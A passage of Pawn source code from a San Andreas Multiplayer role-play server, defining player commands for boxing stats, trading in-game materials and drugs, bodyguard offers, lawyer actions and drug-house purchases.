		SendClientMessage(playerid, COLOR_GREY, "   You're not a Boxer!");
		return 1;
	}

	new string[128], ttext[20];//Title
	new clevel = PlayerInfo[playerid][pBoxSkill];
	if(clevel >= 0 && clevel <= 50) { ttext = "Beginner"; }
	else if(clevel >= 51 && clevel <= 200) { ttext = "Amateur"; }
	else if(clevel >= 201 && clevel <= 400) { ttext = "Professional"; }
	new ntext[20];//NickName
	new level = PlayerInfo[playerid][pWins];
	if(level > 0 && PlayerInfo[playerid][pLoses] == 0)
	{
		ntext = "Undefeated";
	}
	else
	{
		if(level >= 0 && level <= 10) { ntext = "Newcomer"; }
		else if(level >= 11 && level <= 20) { ntext = "Touchy Fist"; }
		else if(level >= 21 && level <= 30) { ntext = "Nut Cracker"; }
		else if(level >= 31 && level <= 40) { ntext = "Tommygun"; }
		else if(level >= 41 && level <= 50) { ntext = "Skull Breaker"; }
		else if(level >= 51 && level <= 60) { ntext = "Light Speed"; }
		else if(level >= 61 && level <= 70) { ntext = "Unbroken Warrior"; }
		else if(level >= 71) { ntext = "Itallion Stallion"; }
	}
	SendClientMessage(playerid, COLOR_WHITE, "|__________________ Boxing Records __________________|");
	format(string, sizeof(string), "| Current Title: %s.", ttext);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "| Current NickName: %s.", ntext);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "| Total Wins: %d.", PlayerInfo[playerid][pWins]);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "| Total Losses: %d.", PlayerInfo[playerid][pLoses]);
	SendClientMessage(playerid, COLOR_GREY, string);
	SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________________|");
	return 1;
}

CMD:give(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	new string[128], giveplayerid, choice[32], amount;
	if(sscanf(params, "us[32]d", giveplayerid, choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /give [playerid/partofname] [name] [amount]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Pot, Crack, Materials");
		return 1;
	}

	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if(amount < 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "You don't have that much!");
				return 1;
			}

			if(!ProxDetectorS(5.0, playerid, giveplayerid))
			{
				SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
				return 1;
			}

			if(giveplayerid == playerid)
			{
			    SendClientMessage(playerid, COLOR_GREY, "You can't use this command on yourself!");
			    return 1;
			}

			if(strcmp(choice, "materials", true) == 0)
			{
				if(PlayerInfo[playerid][pMats] >= amount)
				{
					format(string, sizeof(string), "You have recieved %d Materials from %s.", amount, GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_GRAD2, string);
					PlayerInfo[giveplayerid][pMats] += amount;
					PlayerInfo[playerid][pMats] -= amount;
					new ip[32], ipex[32];
					GetPlayerIp(playerid, ip, sizeof(ip));
					GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
					format(string, sizeof(string), "%s(IP:%s) has given %s(IP:%s) %d materials.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(giveplayerid), ipex, amount);
					Log("logs/pay.log", string);
					format(string, sizeof(string), "You have given %s %d Materials.", GetPlayerNameEx(giveplayerid), amount);
					SendClientMessage(playerid, COLOR_GRAD2, string);
					format(string, sizeof(string), "* %s has given %s some Materials.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "You don't have that much!");
					return 1;
				}
			}
			if(strcmp(choice, "pot", true) == 0)
			{
				if(PlayerInfo[playerid][pPot] >= amount)
				{
					if(amount + PlayerInfo[giveplayerid][pPot] >= 51)
					{
						SendClientMessage(playerid, COLOR_GREY, "That player can't carry more than 50 pot!");
						return 1;
					}
					new level = PlayerInfo[playerid][pDrugsSkill];
					if(level >= 0 && level < 50)
					{ if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 10 at your Skill Level!"); return 1; } }
					else if(level >= 50 && level < 100)
					{ if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 20 at your Skill Level!"); return 1; } }
					else if(level >= 100 && level < 200)
					{ if(amount < 1 || amount > 30) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 30 at your Skill Level!"); return 1; } }
					else if(level >= 200 && level < 400)
					{ if(amount < 1 || amount > 40) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 40 at your Skill Level!"); return 1; } }
					else if(level >= 400)
					{ if(amount < 1 || amount > 50) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 50 at your Skill Level!"); return 1; } }
					format(string, sizeof(string), "You have recieved %d Pot from %s.", amount, GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_GRAD2, string);
					PlayerInfo[giveplayerid][pPot] += amount;
					PlayerInfo[playerid][pPot] -= amount;
					new ip[32], ipex[32];
					GetPlayerIp(playerid, ip, sizeof(ip));
					GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
					format(string, sizeof(string), "You have given %s %d Pot.", GetPlayerNameEx(giveplayerid), amount);
					SendClientMessage(playerid, COLOR_GRAD2, string);
					format(string, sizeof(string), "* %s has given %s some Pot.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "You don't have that much!");
					return 1;
				}
			}
			if(strcmp(choice, "crack", true) == 0)
			{
				if(PlayerInfo[playerid][pCrack] >= amount)
				{
					if(amount + PlayerInfo[giveplayerid][pCrack] >= 26)
					{
						SendClientMessage(playerid, COLOR_GREY, "That player can't carry more than 25 crack!");
						return 1;
					}
					new level = PlayerInfo[playerid][pDrugsSkill];
					if(level >= 0 && level < 50)
					{ if(amount < 1 || amount > 5) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 5 at your Skill Level!"); return 1; } }
					else if(level >= 50 && level < 100)
					{ if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 10 at your Skill Level!"); return 1; } }
					else if(level >= 100 && level < 200)
					{ if(amount < 1 || amount > 15) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 15 at your Skill Level!"); return 1; } }
					else if(level >= 200 && level < 400)
					{ if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 20 at your Skill Level!"); return 1; } }
					else if(level >= 400)
					{ if(amount < 1 || amount > 25) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 25 at your Skill Level!"); return 1; } }
					format(string, sizeof(string), "You have recieved %d Crack from %s.", amount, GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_GRAD2, string);
					PlayerInfo[giveplayerid][pCrack] += amount;
					PlayerInfo[playerid][pCrack] -= amount;
					new ip[32], ipex[32];
					GetPlayerIp(playerid, ip, sizeof(ip));
					GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
					format(string, sizeof(string), "You have given %s %d Crack.", GetPlayerNameEx(giveplayerid), amount);
					SendClientMessage(playerid, COLOR_GRAD2, string);
					format(string, sizeof(string), "* %s has given %s some Crack.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "You don't have that much!");
					return 1;
				}
			}
		}
	}
	return 1;
}

CMD:getmats(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 9 && PlayerInfo[playerid][pJob2] != 9 && PlayerInfo[playerid][pJob] != 18 && PlayerInfo[playerid][pJob2] != 18)
	{
		SendClientMessage(playerid,COLOR_GREY,"   You're not an Arms Dealer or Craftsman!");
		return 1;
	}
	if(CheckPointCheck(playerid))
	{
		SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
		return 1;
	}

	new mypoint = -1;
	new mypointex = -1;
	new mydeliver = 0;

	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && Points[i][Type] == 1)
		{
			mypoint = i;
			mypointex = i;
			mydeliver = Points[i][MatPoint];
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at a Materials Pickup!");
		return 1;
	}
	mypoint = -1;
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(Points[i][MatPoint] == mydeliver && Points[i][Type] == 2)
		{
			mypoint = i;
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, " No Materials Factory found for that Pickup!");
		return 1;
	}

	if(GetPlayerCash(playerid) < 50)
	{
		SendClientMessage(playerid, COLOR_GREY," You can't afford the $50!");
		return 1;
	}
	GivePlayerCash(playerid, -50);
	SetPVarInt(playerid, "Packages", 10);
	SendClientMessage(playerid, COLOR_LIGHTBLUE,"* You bought 10 Materials Packages for $50.");

	SetPVarInt(playerid, "MatDeliver", mydeliver);
	SetPVarInt(playerid, "tpMatRunTimer", 10);
	SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPMATRUNTIMER);

	for(new i = 0; i < sizeof(FamilyInfo); i++)
	{
		if(strcmp(Points[mypointex][Owner], FamilyInfo[i][FamilyName], true) == 0)
		{
			FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+25;
		}
	}
	SetPlayerCheckpoint(playerid, Points[mypoint][Pointx], Points[mypoint][Pointy], Points[mypoint][Pointz], 5);
	return 1;
}



CMD:sellmats(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(PlayerInfo[playerid][pJob] != 9 && PlayerInfo[playerid][pJob2] != 9 && PlayerInfo[playerid][pJob] != 18 && PlayerInfo[playerid][pJob2] != 18)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not an arms dealer or craftsman");
		return 1;
	}
	new string[128];
	if(GetPVarInt(playerid, "SellMatsTimer") > 0)
	{
		format(string, sizeof(string), "You must wait %d seconds before selling more materials.", GetPVarInt(playerid, "SellMatsTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	new giveplayerid, amount, price;
	if(sscanf(params, "udd", giveplayerid, amount, price)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sellmats [playerid/partofname] [amount] [price]");

	if(amount < 1) { SendClientMessage(playerid, COLOR_GREY, "Materials amount must be no lower than 1!"); return 1; }
    if(price < 5000) { SendClientMessage(playerid, COLOR_GREY, "Price must be no lower than $5000, use /give for deals below the scam limit."); return 1; }
	if(amount > PlayerInfo[playerid][pMats]) { SendClientMessage(playerid, COLOR_GREY, "You don't have that many materials!"); return 1; }

	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if(ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(giveplayerid == playerid)
				{
					SendClientMessage(playerid, COLOR_GREY, "Cant sell to yourself!");
					return 1;
				}
				format(string, sizeof(string), "* You offered %s to buy %d materials for $%d.", GetPlayerNameEx(giveplayerid), amount, price);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* %s wants to sell you %d materials for $%d, (type /accept mats) to buy.", GetPlayerNameEx(playerid), amount, price);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

				SetPVarInt(playerid, "SellMatsTimer", 30); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMATSTIMER);

				MatsOffer[giveplayerid] = playerid;
				MatsPrice[giveplayerid] = price;
				MatsAmount[giveplayerid] = amount;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	return 1;
}

CMD:guard(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 8 && PlayerInfo[playerid][pJob2] != 8)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not a bodyguard.");
		return 1;
	}

	if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "You can't heal in the event!");

	if(PlayerBoxing[playerid] > 0)
  	{
   		SendClientMessage(playerid, COLOR_GREY, "You can't offer bodyguard while you're boxing.");
     	return 1;
   	}

	new string[128], giveplayerid, money;
	if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /guard [playerid/partofname] [price]");
	if(GetPVarInt(playerid, "GuardTimer") > 0)
	{
		format(string, sizeof(string), "   You must wait %d seconds before selling another vest.", GetPVarInt(playerid, "GuardTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}
	if(money < 200 || money > 1000) { SendClientMessage(playerid, COLOR_GREY, "Specified price must be between $200 and $1000."); return 1; }
	if(IsPlayerConnected(giveplayerid))
	{

		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				SendClientMessage(playerid, COLOR_GREY, "You can't /guard yourself.");
				return 1;
			}

			SetPVarInt(playerid, "GuardTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GUARDTIMER);
			format(string, sizeof(string), "* You offered protection to %s for $%d.", GetPlayerNameEx(giveplayerid), money);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* Bodyguard %s wants to protect you for $%d, type /accept bodyguard to accept.", GetPlayerNameEx(playerid), money);
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			GuardOffer[giveplayerid] = playerid;
			GuardPrice[giveplayerid] = money;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	}
	return 1;
}

CMD:fmotd(playerid, params[]) {
	if(PlayerInfo[playerid][pGang] < 255) {
	    new
	        string[128];

		format(string, sizeof(string), "Family MOTD: %s.", FamilyInfo[PlayerInfo[playerid][pGang]][FamilyMOTD]);
		SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	return 1;
}

CMD:dropcar(playerid, params[])
{
	return cmd_sellcar(playerid, params);
}

CMD:sellcar(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
	if(PlayerInfo[playerid][pCarTime] == 0)
	{
		if(CheckPointCheck(playerid))
		{
			SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
			return 1;
 		}
 		if(PlayerInfo[playerid][pConnectTime] < 2)
 		{
 		    SendClientMessage(playerid, COLOR_GREY, "You need at least 2 playing hours before you can drop off a car.");
 		    return 1;
 		}

		GameTextForPlayer(playerid, "~w~Car Selling ~n~~r~Drop the car at the Crane", 5000, 1);
		CP[playerid] = 1;
		SetPlayerCheckpoint(playerid, 2695.8699,-2225.3853,13.5501,8.0);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You have already dropped a car, wait until your reload time is over!");
	}
	return 1;
}

CMD:lawyerduty(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 2 || PlayerInfo[playerid][pJob2] == 2)
	{
        if(JobDuty[playerid] == 1)
		{
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're now off duty on your lawyer job and will not receive calls anymore.");
            JobDuty[playerid] = 0;
            Lawyers -= 1;
        }
        else
		{
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're now on duty on your lawyer job and will receive calls from people in need.");
            JobDuty[playerid] = 1;
            Lawyers += 1;
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "   You're not a lawyer!");
    }
    return 1;
}

CMD:defend(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 2 && PlayerInfo[playerid][pJob2] != 2)
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a Lawyer!");
		return 1;
	}

	new string[128];
	if(PlayerInfo[playerid][pLawyerTime] >= 1)
	{
		format(string, sizeof(string), "You must wait %d seconds before you can defend again!", PlayerInfo[playerid][pLawyerTime]);
		SendClientMessage(playerid, COLOR_GRAD1,string);
		return 1;
	}

	new giveplayerid, money;
	if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /defend [playerid/partofname] [price]");
	if(money < 200 || money > 1000) { SendClientMessage(playerid, COLOR_GREY, "   Price not lower than $200 or above $1000!"); return 1; }
	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Cant offer protection to yourself!");
				return 1;
			}
			if(PlayerInfo[giveplayerid][pWantedLevel] > 0)
			{
				format(string, sizeof(string), "* You offered to defend %s for $%d.", GetPlayerNameEx(giveplayerid), money);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Lawyer %s wants to defend you for $%d, (type /accept defense) to accept.", GetPlayerNameEx(playerid), money);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pLawyerTime] = 60;
				DefendOffer[giveplayerid] = playerid;
				DefendPrice[giveplayerid] = money;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   That player is not wanted!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	}
	return 1;
}

CMD:free(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 2 && PlayerInfo[playerid][pJob2] != 2)
		return SendClientMessage(playerid, COLOR_GREY, "   You're not a Lawyer!");

	new
		string[128],
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /free [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid)) {
		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "You can't Free yourself!");

		if(GetDistanceBetweenPlayers(giveplayerid, playerid) > 5)
			return SendClientMessage(playerid, COLOR_GREY, "You're too far away.");

		if(PlayerInfo[playerid][pLawyerFreeTime] >= 1) {
			format(string, sizeof(string), "You must wait %d seconds before you can free again!", PlayerInfo[playerid][pLawyerFreeTime]);
			SendClientMessage(playerid, COLOR_GRAD1,string);
			return 1;
		}

		if(PlayerInfo[giveplayerid][pJailed] == 1 || PlayerInfo[giveplayerid][pJailed] == 2) {
			//ApprovedLawyer[playerid] = 0;
			WantLawyer[giveplayerid] = 0;
			CallLawyer[giveplayerid] = 0;
			JailPrice[giveplayerid] = 0;

			new level = PlayerInfo[playerid][pLawSkill];
			if(level >= 0 && level < 50) {
				PlayerInfo[giveplayerid][pJailTime] -= 60;
				PlayerInfo[playerid][pLawyerFreeTime] = 160;

				format(string, sizeof(string), "* You have reduced %s's jail time by 1 minute.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Your jail time has been reduced by 1 minute by Lawyer %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			} else if(level >= 50 && level < 100) {
				PlayerInfo[giveplayerid][pJailTime] -= 120;
				PlayerInfo[playerid][pLawyerFreeTime] = 120;

				format(string, sizeof(string), "* You have reduced %s's jail time by 2 minutes.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Your jail time has been reduced by 2 minutes by Lawyer %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			} else if(level >= 100 && level < 200) {
				PlayerInfo[giveplayerid][pJailTime] -= 180;
				PlayerInfo[playerid][pLawyerFreeTime] = 90;

				format(string, sizeof(string), "* You have reduced %s's jail time by 3 minutes.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Your jail time has been reduced by 3 minutes by Lawyer %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			} else if(level >= 200 && level < 400) {
				PlayerInfo[giveplayerid][pJailTime] -= 240;
				PlayerInfo[playerid][pLawyerFreeTime] = 60;

				format(string, sizeof(string), "* You have reduced %s's jail time by 4 minutes.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Your jail time has been reduced by 4 minutes by Lawyer %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			} else if(level >= 400) {
				PlayerInfo[giveplayerid][pJailTime] -= 300;
				PlayerInfo[playerid][pLawyerFreeTime] = 30;

				format(string, sizeof(string), "* You have reduced %s's jail time by 5 minutes.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Your jail time has been reduced by 5 minutes by Lawyer %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			}

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pLawSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pLawSkill]++;
				}
			#else
				PlayerInfo[playerid][pLawSkill]++;
			#endif

			if(PlayerInfo[playerid][pLawSkill] == 50)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Lawyer Skill is now Level 2, you will now free faster and have quicker Reload Time."); }
			else if(PlayerInfo[playerid][pLawSkill] == 100)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Lawyer Skill is now Level 3, you will now free faster and have quicker Reload Time."); }
			else if(PlayerInfo[playerid][pLawSkill] == 200)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Lawyer Skill is now Level 4, you will now free faster and have quicker Reload Time."); }
			else if(PlayerInfo[playerid][pLawSkill] == 400)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Your Lawyer Skill is now Level 5, you will now free faster and have quicker Reload Time."); }
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "   Player doesn't need a lawyer / Player isn't jailed!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	}
	return 1;
}

CMD:getcrate(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 14 && PlayerInfo[playerid][pJob2] != 14)
	{
		SendClientMessage(playerid,COLOR_GREY,"   You're not a Drug Smuggler!");
		return 1;
	}
	new mypoint = -1;

	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && strcmp(Points[i][Name], "Drug Factory", true) == 0)
		{
			mypoint = i;
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the Drug Factory!");
		return 1;
	}
	if(PlayerInfo[playerid][pCrates])
	{
		SendClientMessage(playerid, COLOR_GREY, "   You can't hold any more Drug Crates!");
		return 1;
	}
 	if(CheckPointCheck(playerid))
 	{
  		SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
    	return 1;
  	}
	if(GetPlayerCash(playerid) >= 100)
	{
		SendClientMessage(playerid, COLOR_LIGHTRED,"What type of drugs would you like to smuggle? (Type crack or pot)");
		SetPVarInt(playerid, "ChoosingDrugs", 1);
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY," You can't afford the $100!");
		return 1;
	}
}

CMD:getpot(playerid, params[])
{
	new string[128], amount;
	if(sscanf(params, "d", amount)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /getpot [amount]");

	new tel;
	new price;
	new level = PlayerInfo[playerid][pDrugsSkill];
	if(level >= 0 && level < 50)
	{ tel = 10; if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 10 at your Skill Level!"); return 1; } }
	else if(level >= 50 && level < 100)
	{ tel = 10; if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 20 at your Skill Level!"); return 1; } }
	else if(level >= 100 && level < 200)
	{ tel = 10; if(amount < 1 || amount > 30) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 30 at your Skill Level!"); return 1; } }
	else if(level >= 200 && level < 400)
	{ tel = 10; if(amount < 1 || amount > 40) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 40 at your Skill Level!"); return 1; } }
	else if(level >= 400)
	{ tel = 10; if(amount < 1 || amount > 50) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 50 at your Skill Level!"); return 1; } }
	new mypoint = -1;
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && Points[i][Type] == 3)
		{
			mypoint = i;
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the Drug House!");
		return 1;
	}
	if(PlayerInfo[playerid][pPot] >= 25)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You have reached your pot limit of 25 pot.");
		return 1;
	}
	if(PlayerInfo[playerid][pJob] == 4 || PlayerInfo[playerid][pJob2] == 4)
	{
		price = amount * tel;
		if(Points[mypoint][Stock] < amount) return SendClientMessage(playerid, COLOR_GREY, "   This Drug House doesn't have that much pot!");
		if(GetPlayerCash(playerid) > price)
		{
			format(string, sizeof(string), "* You bought %d grams for $%d.", amount, price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, -price);
			PlayerInfo[playerid][pPot] += amount;

			Points[mypoint][Stock] -= amount;
			format(string, sizeof(string), " POT AVAILABLE: %d grams.", Points[mypoint][Stock]);
			UpdateDynamic3DTextLabelText(Points[mypoint][TextLabel], COLOR_YELLOW, string);

			for(new i = 0; i < sizeof(FamilyInfo); i++)
			{
				if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
				{
					FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+price/2;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't afford the drugs!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not a drug dealer.");
		return 1;
	}
	return 1;
}

CMD:getcrack(playerid, params[])
{
	new string[128], amount;
	if(sscanf(params, "d", amount)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /getcrack [amount]");

	new tel;
	new price;
	new level = PlayerInfo[playerid][pDrugsSkill];
	if(level >= 0 && level < 50)
	{
		tel = 50;
		if(amount < 1 || amount > 5)
		{
			SendClientMessage(playerid, COLOR_GREY, "   You can't go above 5 at your Skill Level!");
			return 1;
		}
	}
	else if(level >= 50 && level < 100)
	{ tel = 50; if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   You can't go above 10 at your Skill Level!"); return 1; } }
	else if(level >= 100 && level < 200)
	{ tel = 50; if(amount < 1 || amount > 15) { SendClientMessage(playerid, COLOR_GREY, "   You can't go above 15 at your Skill Level!"); return 1; } }
	else if(level >= 200 && level < 400)
	{ tel = 50; if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   You can't go above 20 at your Skill Level!"); return 1; } }
	else if(level >= 400)
	{ tel = 50; if(amount < 1 || amount > 25) { SendClientMessage(playerid, COLOR_GREY, "   You can't go above 25 at your Skill Level!"); return 1; } }
	new mypoint = -1;
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && Points[i][Type] == 4)
		{
			mypoint = i;
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not at the Crack Lab!");
		return 1;
	}
	if(PlayerInfo[playerid][pCrack] >= 25)
	{
		SendClientMessage(playerid, COLOR_GRAD2, " You have reached your crack limit of 25 crack.");
		return 1;
	}
	if(PlayerInfo[playerid][pJob] == 4 || PlayerInfo[playerid][pJob2] == 4)
	{
